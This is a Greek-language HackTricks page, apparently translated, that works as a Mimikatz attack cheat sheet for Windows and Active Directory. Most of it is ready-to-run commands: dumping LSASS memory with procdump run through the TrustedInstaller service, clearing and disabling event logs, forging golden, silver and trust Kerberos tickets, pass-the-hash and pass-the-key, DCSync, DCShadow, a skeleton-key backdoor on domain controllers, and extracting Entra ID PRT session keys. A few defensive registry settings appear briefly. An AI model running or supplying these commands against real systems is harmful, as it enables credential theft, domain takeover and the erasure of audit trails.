# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Αυτή η σελίδα βασίζεται σε μία από το [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Δείτε το πρωτότυπο για περισσότερες πληροφορίες!<sup>[[3]](#references)</sup>

## LM και clear-text στη μνήμη

Από τα Windows 8.1 και Windows Server 2012 R2 και μετά, έχουν εφαρμοστεί σημαντικά μέτρα για την προστασία από την κλοπή διαπιστευτηρίων:

- **Τα LM hashes και οι plain-text κωδικοί πρόσβασης** δεν αποθηκεύονται πλέον στη μνήμη, για ενίσχυση της ασφάλειας. Μια συγκεκριμένη ρύθμιση μητρώου, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, πρέπει να οριστεί σε τιμή DWORD `0` ώστε να απενεργοποιηθεί το Digest Authentication και να διασφαλιστεί ότι οι κωδικοί πρόσβασης σε "clear-text" δεν αποθηκεύονται στην cache του LSASS.

- **Η προστασία LSA** εισάγεται για να προστατεύσει τη διεργασία Local Security Authority (LSA) από μη εξουσιοδοτημένη ανάγνωση μνήμης και εισαγωγή κώδικα. Αυτό επιτυγχάνεται με τη σήμανση του LSASS ως προστατευμένης διεργασίας. Για την ενεργοποίηση της προστασίας LSA:
  1. Τροποποιήστε το μητρώο στη θέση _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_, ορίζοντας το `RunAsPPL` σε `dword:00000001`.
  2. Εφαρμόστε ένα Group Policy Object (GPO) που επιβάλλει αυτήν την αλλαγή μητρώου σε όλες τις διαχειριζόμενες συσκευές.

Παρά τις προστασίες αυτές, εργαλεία όπως το Mimikatz μπορούν να παρακάμψουν την προστασία LSA χρησιμοποιώντας συγκεκριμένους drivers, αν και τέτοιες ενέργειες είναι πιθανό να καταγραφούν στα event logs.

Στους σύγχρονους σταθμούς εργασίας αυτό έχει ακόμη μεγαλύτερη σημασία, επειδή το **Credential Guard είναι ενεργοποιημένο από προεπιλογή σε πολλά συστήματα Windows 11 22H2+ και Windows Server 2025 που είναι ενταγμένα σε domain και δεν είναι DC**, ενώ το **LSASS-as-PPL είναι ενεργοποιημένο από προεπιλογή σε νέες εγκαταστάσεις Windows 11 22H2+**. Στην πράξη, αυτό σημαίνει ότι το `sekurlsa::logonpasswords` συχνά αποδίδει λιγότερα δεδομένα από όσα αναμένονταν με παλαιότερες τεχνικές και οι operators στρέφονται όλο και περισσότερο σε **offline minidumps**, **εξαγωγή κλειδιών Kerberos (`sekurlsa::ekeys`)** ή **modules προσανατολισμένα σε CloudAP/PRT**. Για την πλευρά της προστασίας, δείτε τις [προστασίες διαπιστευτηρίων των Windows](credentials-protections.md).

### Αντιμετώπιση της αφαίρεσης του SeDebugPrivilege

Οι διαχειριστές έχουν συνήθως το SeDebugPrivilege, το οποίο τους επιτρέπει να κάνουν debugging σε προγράμματα. Αυτό το προνόμιο μπορεί να περιοριστεί για την αποτροπή μη εξουσιοδοτημένων memory dumps, μια συνηθισμένη τεχνική που χρησιμοποιούν οι επιτιθέμενοι για να εξαγάγουν διαπιστευτήρια από τη μνήμη. Ωστόσο, ακόμη κι αν αυτό το προνόμιο αφαιρεθεί, ο λογαριασμός TrustedInstaller μπορεί και πάλι να δημιουργήσει memory dumps χρησιμοποιώντας μια προσαρμοσμένη διαμόρφωση υπηρεσίας:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

Αυτό επιτρέπει το dumping της μνήμης του `lsass.exe` σε αρχείο, το οποίο μπορεί στη συνέχεια να αναλυθεί σε άλλο σύστημα για την εξαγωγή διαπιστευτηρίων:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Επιλογές Mimikatz

Η παραποίηση του αρχείου καταγραφής συμβάντων στο Mimikatz περιλαμβάνει δύο βασικές ενέργειες: την εκκαθάριση των αρχείων καταγραφής συμβάντων και την τροποποίηση της υπηρεσίας Event, ώστε να αποτρέπεται η καταγραφή νέων συμβάντων. Παρακάτω παρατίθενται οι εντολές για την εκτέλεση αυτών των ενεργειών:

#### Εκκαθάριση αρχείων καταγραφής συμβάντων

Το Mimikatz παρέχει την εντολή `event::clear`. Καλεί το API εκκαθάρισης αρχείων καταγραφής συμβάντων των Windows για το επιλεγμένο κλασικό αρχείο καταγραφής. Η προεπιλογή είναι το `Security`· το `/log:` επιλέγει άλλο αρχείο καταγραφής και ο χρήστης που την εκτελεί χρειάζεται δικαιώματα για να το εκκαθαρίσει. Αυτό δεν είναι το ίδιο με την `event::drop`, η οποία επιχειρεί να αποτρέψει την εγγραφή νέων εγγραφών.<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Πειραματική λειτουργία: Ενημέρωση του Event Service

- **Εντολή**: `event::drop`
- Αυτή η πειραματική εντολή έχει σχεδιαστεί για να τροποποιεί τη συμπεριφορά του Event Logging Service, εμποδίζοντάς το ουσιαστικά να καταγράφει νέα συμβάντα.
- Παράδειγμα: `mimikatz "privilege::debug" "event::drop" exit`

- Η εντολή `privilege::debug` διασφαλίζει ότι το Mimikatz διαθέτει τα απαραίτητα δικαιώματα για να τροποποιήσει τις υπηρεσίες συστήματος.
- Στη συνέχεια, η εντολή `event::drop` ενημερώνει το Event Logging Service.

### Επιθέσεις με Kerberos Ticket

Χρησιμοποιήστε τις παρακάτω εντολές ως γρήγορη υπενθύμιση σύνταξης. Οι ειδικές σελίδες για τα [golden tickets](../active-directory-methodology/golden-ticket.md), τα [silver tickets](../active-directory-methodology/silver-ticket.md), τα [diamond tickets](../active-directory-methodology/diamond-ticket.md) και τα [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) περιέχουν τις πιο πρόσφατες λεπτομέρειες σχετικά με AES/PAC/opsec.

### Δημιουργία Golden Ticket

Ένα Golden Ticket επιτρέπει την πλαστοπροσωπία με πρόσβαση σε ολόκληρο τον τομέα. Βασική εντολή και παράμετροι:

- Εντολή: `kerberos::golden`
- Παράμετροι:
  - `/domain`: Το όνομα του τομέα.
  - `/sid`: Το Security Identifier (SID) του τομέα.
  - `/user`: Το όνομα χρήστη που θα πλαστοπροσωπήσετε.
  - `/krbtgt`: Το NTLM hash του λογαριασμού υπηρεσίας KDC του τομέα.
  - `/ptt`: Εισάγει απευθείας το ticket στη μνήμη.
  - `/ticket`: Αποθηκεύει το ticket για μελλοντική χρήση.

Παράδειγμα:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Δημιουργία Silver Ticket

Τα Silver Tickets παρέχουν πρόσβαση σε συγκεκριμένες υπηρεσίες. Βασική εντολή και παράμετροι:

- Εντολή: Παρόμοια με το Golden Ticket, αλλά στοχεύει συγκεκριμένες υπηρεσίες.
- Παράμετροι:
  - `/service`: Η υπηρεσία-στόχος (π.χ. cifs, http).
  - Άλλες παράμετροι παρόμοιες με του Golden Ticket.

Παράδειγμα:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Δημιουργία Trust Ticket

Τα Trust Tickets χρησιμοποιούνται για πρόσβαση σε πόρους μεταξύ domains, αξιοποιώντας σχέσεις εμπιστοσύνης. Βασικές εντολές και παράμετροι:

- Command: Παρόμοιο με το Golden Ticket, αλλά για σχέσεις εμπιστοσύνης.
- Parameters:
  - `/target`: Το FQDN του domain-στόχου.
  - `/rc4`: Το NTLM hash του trust account.

Example:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Πρόσθετες εντολές Kerberos

- **Listing Tickets**:

  - Εντολή: `kerberos::list`
  - Εμφανίζει όλα τα Kerberos tickets για την τρέχουσα συνεδρία χρήστη.

- **Pass the Cache**: Η `kerberos::ptc` διαβάζει ένα αρχείο MIT/Heimdal `.ccache`, **όχι** ένα αρχείο `.kirbi`. Δώστε τη διαδρομή του αρχείου ως positional argument: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>

- **Pass the Ticket**: Η `kerberos::ptt` διαβάζει ένα αρχείο `.kirbi` ή έναν κατάλογο με τέτοια αρχεία. Δέχεται επίσης διαδρομή ως positional argument, όχι `/ticket:`: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`. Δείτε το [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md) για την ευρύτερη ροή εργασίας.<sup>[[6]](#references)</sup>

- **Purge Tickets**:
  - Εντολή: `kerberos::purge`
  - Διαγράφει όλα τα Kerberos tickets από τη συνεδρία.
  - Χρήσιμο πριν από τη χρήση εντολών χειρισμού tickets, για την αποφυγή διενέξεων.

### Over-Pass-the-Hash / Pass-the-Key

Αν το `RC4` είναι απενεργοποιημένο ή αναξιόπιστο, το Mimikatz μπορεί να εισαγάγει με patch τα **κλειδιά Kerberos AES128/AES256** στην τρέχουσα συνεδρία σύνδεσης, αντί να χρησιμοποιεί μόνο ένα NT hash. Αυτό συνήθως ταιριάζει καλύτερα σε σύγχρονα domains απ' ό,τι η αντιμετώπιση του `sekurlsa::pth` ως εργαλείου αποκλειστικά για NTLM.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` επαναχρησιμοποιεί την τρέχουσα διεργασία αντί να δημιουργεί νέα κονσόλα, κάτι χρήσιμο όταν θέλετε να εκτελέσετε αμέσως εντολές όπως `lsadump::dcsync` στο ίδιο πλαίσιο.

### Παραποίηση του Active Directory

- **DCShadow**: Κάνει προσωρινά ένα μηχάνημα να λειτουργεί ως DC για τον χειρισμό αντικειμένων AD. Δείτε [DCShadow](../active-directory-methodology/dcshadow.md).

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Μιμείται έναν DC για να ζητήσει δεδομένα κωδικών πρόσβασης. Δείτε [DCSync](../active-directory-methodology/dcsync.md).
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Πρόσβαση σε διαπιστευτήρια

- **LSADUMP::LSA**: Εξαγωγή διαπιστευτηρίων από το LSA.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Μίμηση ενός DC με χρήση των δεδομένων κωδικού πρόσβασης ενός λογαριασμού υπολογιστή.

  - _Δεν παρέχεται συγκεκριμένη εντολή για το NetSync στο αρχικό πλαίσιο._

- **LSADUMP::SAM**: Πρόσβαση στην τοπική βάση δεδομένων SAM.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Αποκρυπτογράφηση μυστικών που είναι αποθηκευμένα στο μητρώο.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Ορισμός νέου NTLM hash για έναν χρήστη.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Ανάκτηση πληροφοριών ελέγχου ταυτότητας εμπιστοσύνης.
  - `mimikatz "lsadump::trust" exit`

### Διαπιστευτήρια cloud / Entra ID

Σε υπολογιστές με **Entra ID** ή **hybrid-joined**, η `sekurlsa::cloudap` μπορεί να αποκαλύψει αποθηκευμένο στην cache υλικό **Primary Refresh Token (PRT)** από το LSASS. Το `ProofOfPossesionKey.KeyValue` είναι το blob του session key που προστατεύεται από DPAPI, όχι το ήδη αποκρυπτογραφημένο κλειδί.<sup>[[7]](#references)[[8]](#references)</sup> Για να χρησιμοποιήσετε το `/unprotect`, εκτελέστε το `dpapi::cloudapkd` ως `SYSTEM` (για παράδειγμα, με `token::elevate` από μια ανυψωμένη συνεδρία Mimikatz) ή γεμίστε πρώτα την cache κλειδιών του Mimikatz με `sekurlsa::dpapi`. Η `privilege::debug` από μόνη της δεν αλλάζει το πλαίσιο του καλούντος DPAPI.<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

Αντιγράψτε τα **matching** `Context` και `Derived Key` από την πρώτη εντολή στη δεύτερη· το Mimikatz δημιουργεί νέο context αν δεν δοθεί κάποιο. Ακόμη και για κλειδί που προστατεύεται από TPM, το Mimikatz μπορεί να παράγει ένα signing key χρησιμοποιώντας το TPM στην αρχική συσκευή. Δεν χρειάζεται εξαγωγή του κλειδιού σε καθαρή μορφή, αλλά ένα επιτυχές αποτέλεσμα derived-key μπορεί να υπογράψει ένα browser cookie.<sup>[[7]](#references)</sup>

Μια συμβολοσειρά PRT από μόνη της δεν αρκεί, επειδή το Microsoft Entra απαιτεί απόδειξη κατοχής του σχετικού session key.<sup>[[9]](#references)</sup> Δείτε την [ανάκτηση κλειδιών DPAPI](../windows-local-privilege-escalation/dpapi-extracting-passwords.md) για άλλες επιλογές master-key και το [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) για την αλυσίδα από την πλευρά του cloud.

### Διάφορα

- **MISC::Skeleton**: Εισαγωγή backdoor στο LSASS σε DC.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Κλιμάκωση προνομίων

- **PRIVILEGE::Backup**: Απόκτηση δικαιωμάτων δημιουργίας αντιγράφων ασφαλείας.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Απόκτηση δικαιωμάτων debug.
  - `mimikatz "privilege::debug" exit`

### Εξαγωγή διαπιστευτηρίων

- **SEKURLSA::LogonPasswords**: Εμφάνιση διαπιστευτηρίων για συνδεδεμένους χρήστες.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Εξαγωγή εισιτηρίων Kerberos από τη μνήμη.
  - `mimikatz "sekurlsa::tickets /export" exit`

### Χειρισμός SID και Token

- **SID::add/modify**: Αλλαγή των SID και SIDHistory.

  - Προσθήκη: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Τροποποίηση: _Δεν υπάρχει συγκεκριμένη εντολή τροποποίησης στο αρχικό πλαίσιο._

- **TOKEN::Elevate**: Μίμηση token.
  - `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Επιτρέπονται πολλαπλές συνεδρίες RDP.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Εμφάνιση συνεδριών TS/RDP.
  - _Δεν παρέχεται συγκεκριμένη εντολή για το TS::Sessions στο αρχικό πλαίσιο._

### Vault

- Εξαγωγή κωδικών πρόσβασης από το Windows Vault.
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [Τα εργαλεία του Hacker – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB και Entra ID: Γνωρίστε τη νέα ροή cache](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Αναφορά εντολών Mimikatz](https://adsecurity.org/?page_id=1821)
- [4] [Πηγαίος κώδικας του Mimikatz event module](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Πηγαίος κώδικας του Mimikatz ccache module](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Πηγαίος κώδικας του Mimikatz Kerberos module](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Υλοποίηση CloudAP DPAPI του Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Εμβαθύνοντας περισσότερο στο Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Προστασία του Microsoft Entra Primary Refresh Token](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
